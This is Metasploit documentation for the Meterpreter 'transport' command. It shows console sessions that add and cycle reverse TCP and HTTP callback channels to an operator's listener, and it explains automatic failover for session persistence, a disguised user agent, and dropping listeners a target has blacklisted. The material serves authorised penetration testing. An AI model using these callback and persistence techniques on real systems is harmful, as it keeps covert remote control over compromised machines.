## On this page
* [Transport configuration](#transport-configuration)
* [The `transport` command](#the-transport-command)
  * [Listing transports](#listing-transports)
  * [Adding transports](#adding-transports)
  * [Changing transports](#changing-transports)
  * [Removing transports](#removing-transports)
  * [Resilient transports](#resilient-transports)
* [Supported Meterpreters](#supported-meterpreters)

The Meterpreter that we have known and loved for years has always had the ability to specify the type of transport that is to be used for the session. `reverse_tcp` and `reverse_https` are the favorites. Previously,  the flexibility for transport selection is only available at the time the payloads are created, or when the exploit is launched, effectively locking the Meterpreter session into a single type of transport for the lifetime of the session.

Recent modifications to Meterpreter have changed this. Meterpreter has a new [[configuration system|Meterpreter-Configuration]] that supports multiple transports and it now supports the addition of new transports while the session is still running. With the extra transports configured, Meterpreter allows the user to cycle through those transports without shutting down the session.

Not only that, but Meterpreter will cycle through these transports automatically when communication fails. For more information on the session resiliency features, please view the [[Meterpreter Reliable Network Communication|[[reliable network communication documentation|./Meterpreter-Reliable-Network-Communication.md]].

This document describes how multiple transports are added to an existing Meterpreter session.

## Transport configuration

It is not possible to add multiple transports to payloads or exploits prior to launching them. This is due to the fact that `msfvenom` the built-in payload mechanisms in Metasploit need to be modified to allow for multiple transports to be selected prior to the generation of the payload. This work is ongoing, and hopefully, it'll be implemented soon. For now, a single transport has to be chosen, using the same mechanism that has always been in use.

## The `transport` command

Meterpreter has a new base command called `transport`. This is the hub of all transport-related commands and will allow you to list them, add new ones, cycle through them on the fly, and remove those which are no longer valid or useful.

The following output shows the current help text for the `transport` command:

```msf
meterpreter > transport
Usage: transport <list|change|add|next|prev|remove> [options]

   list: list the currently active transports.
    add: add a new transport to the transport list.
 change: same as add, but changes directly to the added entry.
   next: jump to the next transport in the list (no options).
   prev: jump to the previous transport in the list (no options).
 remove: remove an existing, non-active transport.

OPTIONS:

    -A <opt>  User agent for HTTP/S transports (optional)
    -B <opt>  Proxy type for HTTP/S transports (optional: http, socks; default: http)
    -C <opt>  Comms timeout (seconds) (default: same as current session)
    -H <opt>  Proxy host for HTTP/S transports (optional)
    -N <opt>  Proxy password for HTTP/S transports (optional)
    -P <opt>  Proxy port for HTTP/S transports (optional)
    -T <opt>  Retry total time (seconds) (default: same as current session)
    -U <opt>  Proxy username for HTTP/S transports (optional)
    -W <opt>  Retry wait time (seconds) (default: same as current session)
    -X <opt>  Expiration timeout (seconds) (default: same as current session)
    -c <opt>  SSL certificate path for https transport verification (optional)
    -h        Help menu
    -i <opt>  Specify transport by index (currently supported: remove)
    -l <opt>  LHOST parameter (for reverse transports)
    -p <opt>  LPORT parameter
    -t <opt>  Transport type: reverse_tcp, reverse_http, reverse_https, bind_tcp
    -u <opt>  Local URI for HTTP/S transports (used when adding/changing transports with a custom LURI)
    -v        Show the verbose format of the transport list


```

### Listing transports

The simplest of all the sub-commands in the `transport` set is `list`. This command shows the full list of currently enabled transport, and an indicator of which one is the "current" transport. The following shows the non-verbose output with just the default transport running:

```msf
meterpreter > transport list
Session Expiry  : @ 2015-06-09 19:56:05

    Curr  URL                    Comms T/O  Retry Total  Retry Wait
    ----  ---                    ---------  -----------  ----------
    *     tcp://10.1.10.40:6000  300        3600         10
```

The first part of the output is the session expiry time. To learn more about expiry time, see [Meterpreter Timeout Control][].

The above output shows that we have one transport enabled that is using `TCP`. We can infer that the transport was a `reverse_tcp` (rather than `bind_tcp`) due to the fact that there is a host IP address in the transport URL. If it was a `bind_tcp`, this would be blank.

`Comms T/O` refers to the communications timeout value. `Retry Total` is the total time to attempt reconnects on this transport, and `Retry Wait` indicates how often a retry of the current transport should happen. Each of these is documented in depth in the [[Timeout documentation|./meterpreter-timeout-control.md]].

The verbose version of this command shows more detail about the transport, but only in cases where extra detail is available (such as `reverse_http/s`). The following command shows the output of the `list` sub-command with the verbose flag (`-v`) after an `HTTP` transport has been added:

```msf
meterpreter > transport list -v
Session Expiry  : @ 2015-06-09 19:56:05

    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait  User Agent               Proxy Host  Proxy User  Proxy Pass  Cert Hash
    ----  ---                                                                                                    ---------  -----------  ----------  ----------               ----------  ----------  ----------  ---------
    *     tcp://10.1.10.40:6000                                                                                  300        3600         10
          http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500        Totes-Legit Browser/1.1
```

### Adding transports

Adding transports gives Meterpreter the ability to work on different transport mechanisms with the goal of keeping the sessions alive for longer. The command for adding new transports varies slightly depending on the transport that is being added.

The following command shows a simple example that adds a `reverse_http` transport to an existing Meterpreter session. It specifies a custom communications timeout, retry total and retry wait, and also specifies a custom user-agent string to be used for the HTTP requests:

```msf
meterpreter > transport add -t reverse_http -l 10.1.10.40 -p 5105 -T 50000 -W 2500 -C 100000 -A "Totes-Legit Browser/1.1"
[*] Adding new transport ...
[+] Successfully added reverse_http transport.
```

This command is what was used to create the transport that was listed in the sample verbose output for the `transport list` command. Here's a deeper explanation of the parameters:

* The `-t` option is what tells Metasploit what type of transport to add. The options are `bind_tcp`, `reverse_tcp`, `reverse_http` and `reverse_https`. These match those that are used for the construction of the original payloads. Given that we are not dealing with stages, there is no `reverse_winhttps` because Meterpreter always uses the WinHTTP API behind the scenes anyway.
* The `-l` option specifies what we all know as the `LHOST` parameter.
* The `-p` option specifies what we all know as the `LPORT` parameter.
* The `-T` option matches the `retry total` parameter. The measure of this value is in seconds, and should be a positive integer that is more than `-W`.
* The `-W` option matches the `retry wait` parameter. The measure of this value is in seconds and should be a positive integer that is less than `-T`.
* The `-C` option matches the `communication timeout`. The measure of this value is in seconds and should be a positive integer.
* The `-A` specifies a custom user agent that is used for HTTP requests.

It is also possible to specify the following:

* The `-u` option allows the addition of a local URI (`LURI`) value that is prepended to the UUID URI that is used for all requests. This URI value helps segregate listeners and payloads based on a URI.
* The `-H` option specifies a proxy host/IP. This parameter is optional.
* The `-B` option specifies a proxy type, and needs to be set to `http` or `socks`. If not specified alongside the `-H` parameter, the default type is `http`.
* The `-P` option specifies the port that the proxy is listening on. This should be set when `-H` is set.
* The `-U` option specifies the username to use to authenticate with the proxy. This parameter is optional.
* The `-N` option specifies the password to use to authenticate with the proxy. This parameter is optional.
* The `-X` option specifies the overall Meterpreter session timeout value. While this value is not transport-specific, the option is provided here so that it can be set alongside the other transport-specific timeout values for ease of use.
* Finally the `-c` parameter can be used to indicate the expected SSL certificate. This parameter expects a file path to an SSL certificate in `PEM` format. The SHA1 hash of the certificate is extracted from the file, and this is used during the request validation process. If this file doesn't exist or doesn't contain a valid certificate, then the request should fail.

The following shows another example which adds another `reverse_tcp` transport to the transport list:

```msf
meterpreter > transport add -t reverse_tcp -l 10.1.10.40 -p 5005
[*] Adding new transport ...
[+] Successfully added reverse_tcp transport.
meterpreter > transport list
Session Expiry  : @ 2015-06-09 19:56:05

    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
    ----  ---                                                                                                    ---------  -----------  ----------
    *     tcp://10.1.10.40:6000                                                                                  300        3600         10
          http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
          tcp://10.1.10.40:5005                                                                                  300        3600         10
```

Note that these examples only add new transports, they do not change the current transport mechanism. When a transport is added to the list of transports, they are always added at the _end_ of the list, and not the start.

### Change transports

There are three different ways to change transports. One thing they do have in common is that transport switching assumes that you have listeners set up to receive the connections. If no listener or handler is present, then the resiliency features in Meterpreter will cause it to constantly attempt to establish connectivity on that transport using the transport timeout values that were configured. If the transport ultimately fails, then Meterpreter will cycle to the next transport on the list and try again. This will continue until a transport connection is successful, or the session timeout expires. More information on this can be found in the **session resiliency documentation** (link coming soon).

The three different ways to change transports are:

* `transport next` - This command will cause Meterpreter to shut down the current transport, and attempt to reconnect to Metasploit using the next transport in the list of transports.
* `transport prev` - This command is the same as `transport next`, except that it will move to the previous transport on the list, and not the next one.
* `transport change ...` - This command is equivalent to running `transport add`, and requires all the parameters that `transport add` requires (resulting in a new transport at the end of the list), and then `transport prev` (which is the same as going from the start of the list to the end). The net effect is the same as creating a new transport and immediately switching to it.

As an example, here is the current transport setup:

```msf
meterpreter > transport list
Session Expiry  : @ 2015-06-09 19:56:05

    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
    ----  ---                                                                                                    ---------  -----------  ----------
    *     tcp://10.1.10.40:6000                                                                                  300        3600         10
          http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
          tcp://10.1.10.40:5005                                                                                  300        3600         10
```

Moving to the next transport:

```msf
meterpreter > transport next
[*] Changing to next transport ...
[+] Successfully changed to the next transport, killing current session.

[*] 10.1.10.35 - Meterpreter session 1 closed.  Reason: User exit
msf exploit(handler) >
[*] 10.1.10.40:46130 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) Attaching orphaned/stageless session ...
[*] Meterpreter session 2 opened (10.1.10.40:5105 -> 10.1.10.40:46130) at 2015-06-02 20:53:54 +1000

msf exploit(handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > transport list
Session Expiry  : @ 2015-06-09 19:56:05

    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
    ----  ---                                                                                                    ---------  -----------  ----------
    *     http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
          tcp://10.1.10.40:5005                                                                                  300        3600         10
          tcp://10.1.10.40:6000                                                                                  300        3600         10
```

This output shows that we moved from the original `reverse_tcp` to the `reverse_http` transport, and this is now the current transport.

Moving to the next transport again takes the session to the second `reverse_tcp` listener:

```msf
meterpreter > transport next
[*] Changing to next transport ...
[+] Successfully changed to the next transport, killing current session.

[*] 10.1.10.35 - Meterpreter session 2 closed.  Reason: User exit
msf exploit(handler) > [*] Meterpreter session 3 opened (10.1.10.40:5005 -> 10.1.10.35:49277) at 2015-06-02 20:54:45 +1000

msf exploit(handler) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > transport list
Session Expiry  : @ 2015-06-09 19:56:06

    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
    ----  ---                                                                                                    ---------  -----------  ----------
    *     tcp://10.1.10.40:5005                                                                                  300        3600         10
          tcp://10.1.10.40:6000                                                                                  300        3600         10
          http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
```

From here, moving backward sends Meterpreter back to the `reverse_http` listener:

```msf
meterpreter > transport prev
[*] Changing to previous transport ...

[*] 10.1.10.40:46245 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) Attaching orphaned/stageless session ...
[+] Successfully changed to the previous transport, killing current session.

[*] 10.1.10.35 - Meterpreter session 3 closed.  Reason: User exit
msf exploit(handler) > [*] Meterpreter session 4 opened (10.1.10.40:5105 -> 10.1.10.40:46245) at 2015-06-02 20:55:07 +1000

msf exploit(handler) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > transport list
Session Expiry  : @ 2015-06-09 19:56:05

    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
    ----  ---                                                                                                    ---------  -----------  ----------
    *     http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
          tcp://10.1.10.40:5005                                                                                  300        3600         10
          tcp://10.1.10.40:6000                                                                                  300        3600         10
```

### Remove transports

It is also possible to remove transports from the underlying transport list. This is valuable in cases where you want Meterpreter to always callback on stageless listeners (allowing you to avoid the unnecessary upload of the second stage), or when you have a listener located at an IP address that may have been blacklisted by your target as a result of your post-exploitation shenanigans.

The command is similar to `add` in that it takes a subset of the parameters, and then adds a new one on top of it:

* `-t` - The transport type.
* `-l` - The `LHOST` value (unless it's `bind_tcp`).
* `-p` - The `LPORT` value.
* `-u` - This value is only required for `reverse_http/s` transports and needs to contain the URI of the transport in question. This is important because there might be multiple listeners on the same IP and port, so the URI is what differentiates each of the sessions.

```msf
[*] Starting interaction with 2...

meterpreter > transport list
Session Expiry  : @ 2015-07-10 07:39:08

    Curr  URL                                                                                                             Comms T/O  Retry Total  Retry Wait
    ----  ---                                                                                                             ---------  -----------  ----------
    *     tcp://10.1.10.40:5000                                                                                           300        3600         10
          http://10.1.10.40:9090/jYGS61OX8On-Dv8Pq5v9FAJAEobAlrL4J2FBOf_3DsnZzCJAY6-Dh_8AeWdrkFwRbQdvz4vOo8let4huygVLPJ/  300        3600         10

meterpreter > transport remove -t reverse_http -l 10.1.10.40 -p 9090 -u jYGS61OX8On-Dv8Pq5v9FAJAEobAlrL4J2FBOf_3DsnZzCJAY6-Dh_8AeWdrkFwRbQdvz4vOo8let4huygVLPJ
[*] Removing transport ...
[+] Successfully removed reverse_http transport.
meterpreter > transport list
Session Expiry  : @ 2015-07-10 07:39:08

    Curr  URL                    Comms T/O  Retry Total  Retry Wait
    ----  ---                    ---------  -----------  ----------
    *     tcp://10.1.10.40:5000  300        3600         10

meterpreter >
```

### Resilient transports

Previously, Meterpreter only had built-in resiliency in the `HTTP/S` payloads and this was due to the nature of `HTTP/S` as a stateless protocol. Meterpreter now has resiliency features baked into `TCP` transports as well, both `reverse` and `bind`. If communication fails on a given transport, Meterpreter will roll over to the next one automatically.

The following shows Metasploit being closed and leaving the existing `TCP` session running behind the scenes:

```msf
meterpreter > transport list
Session Expiry  : @ 2015-06-09 19:56:05

    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
    ----  ---                                                                                                    ---------  -----------  ----------
    *     tcp://10.1.10.40:6000                                                                                  300        3600         10
          http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
          tcp://10.1.10.40:5005                                                                                  300        3600         10

meterpreter > background
[*] Backgrounding session 5...
msf exploit(handler) > exit -y
```

With Metasploit closed, the Meterpreter session has detected that the transport is no longer functioning. Behind the scenes, Meterpreter has shut down this `TCP` transport, and has automatically moved over to the `HTTP` transport as this was the next transport in the list. From here, Meterpreter continues to try to re-establish connectivity with Metasploit on this transport a per the transport timeout settings.

The following output shows Metasploit being re-launched with the appropriate listeners, and the existing Meterpreter instance establishing a session automatically:

```msf
./msfconsole -r ~/msf.rc
[*] Starting the Metasploit Framework console...|
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v4.11.0-dev [core:4.11.0.pre.dev api:1.0.0]]
+ -- --=[ 1460 exploits - 835 auxiliary - 229 post        ]
+ -- --=[ 426 payloads - 37 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

... snip ...

[*] 10.1.10.40:46457 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) Attaching orphaned/stageless session ...
[*] Meterpreter session 1 opened (10.1.10.40:5105 -> 10.1.10.40:46457) at 2015-06-02 21:03:55 +1000

msf exploit(handler) > sessions -l

Active sessions
===============

  Id  Type                   Information                           Connection
  --  ----                   -----------                           ----------
  1   meterpreter x86/win32  WIN-S45GUQ5KGVK\OJ @ WIN-S45GUQ5KGVK  10.1.10.40:5105 -> 10.1.10.40:46457 (10.1.10.35)

msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > transport list
Session Expiry  : @ 2015-06-09 19:56:05

    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
    ----  ---                                                                                                    ---------  -----------  ----------
    *     http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
          tcp://10.1.10.40:5005                                                                                  300        3600         10
          tcp://10.1.10.40:6000                                                                                  300        3600         10
```

The session is back up and running as if nothing had gone wrong.

In the case where Meterpreter is configured with only a single transport mechanism, this process still takes place. Meterpreter's transport list implementation is a cyclic linked-list, and once the end of the list has been reached, it simply starts from the beginning again. This means that if there's a list of one transport then Meterpreter will continually attempt to use that one transport until the session expires. This works for both `TCP` and `HTTP/S`.

For important detail on network resiliency, please see the [[reliable network communication documentation|./Meterpreter-Reliable-Network-Communication.md]]

## Supported Meterpreters

The following Meterpreter implementations currently support the transport commands:

 * Windows x86
 * Windows x64
 * POSIX x86
 * Android
 * Java
 * Python
